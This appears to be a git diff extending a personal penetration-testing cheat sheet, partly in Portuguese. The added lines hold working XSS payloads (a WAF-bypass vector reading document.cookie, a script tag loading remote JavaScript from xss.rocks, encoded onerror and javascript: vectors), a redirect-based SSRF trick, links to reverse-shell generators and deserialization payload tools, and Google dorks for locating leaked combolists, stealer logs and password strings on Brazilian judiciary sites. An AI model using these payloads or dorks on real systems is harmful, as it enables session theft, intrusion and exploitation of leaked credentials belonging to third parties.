@@ -33,6 +33,18 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 
 Cross Site Scripting (XSS) Akamai WAF Bypass
 <!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+
+Ideia de injetar <style> com XSS ou injetar outras tags html para formar uma nova página de login: 
+https://saajanbhujel.medium.com/how-i-got-10-000-from-github-for-bypassing-filtration-of-html-tags-db31173c8b37
+
+XSS fazendo um ssrf:.
+<script>window.location="http://endereço.."</script>
+
+Others:
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+<img src/onerror=alert(1)>
+<a href="javascript:alert(1)"></a>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 ```
 
 ```javascript
@@ -91,6 +103,8 @@ https://systemweakness.com/sql-injection-to-remote-command-execution-rce-dd9a752
 
 RCE:
 ```
+https://www.revshells.com/
+https://www.100security.com.br/reverse-shell
 https://4bdoz.medium.com/rce-by-code-injection-perl-reverse-shell-a2e90181b10
 ```
 
@@ -244,6 +258,15 @@ Insecure Deserialization
 ```
 Payloads: https://github.com/pwntester/ysoserial.net
 Json insercure deserialization: https://medium.com/r3d-buck3t/insecure-deserialization-with-json-net-c70139af011a
+
+Json payloads:
+https://github.com/pwntester/ysoserial.net
+https://medium.com/c-sharp-progarmming/stop-insecure-deserialization-with-c-6a488c95cf2f
+```
+
+WT authentication bypass via jwt header injection 
+```
+https://www.youtube.com/watch?v=fdmnw3C8x34&ab_channel=Hacklass
 ```
 
 PHP Notes
@@ -264,4 +287,26 @@ https://hackcommander.github.io/pentesting-article-1/#
 	  "mode": "cors",
 	}).then((r)=>r.text()).
 	    then((r)=>console.log(r));
+```
+
+Dorks
+```
+> https://www.exploit-db.com/google-hacking-database/
+> https://www.googleguide.com/advanced_operators_reference.html
+
+Encontrar vazamentos direto pelos sites de hospedagem:
+> intitle:( combolist | dehashed | stealer ) site:anonfiles.com
+
+O AnonFiles é o mais utilizado atualmente, mas também encontra coisas interessantes em outras plataformas. Google Drive incluso:
+
+> bayfiles.com
+> dataism-x.com
+> pastebin.com
+> justpaste.it
+> file.io
+> filechan.org
+> mega.com
+> drive.google.com
+
+*jus.br intext:"usuario" | "senha" | "username" | "password" | "mysql"
 ```
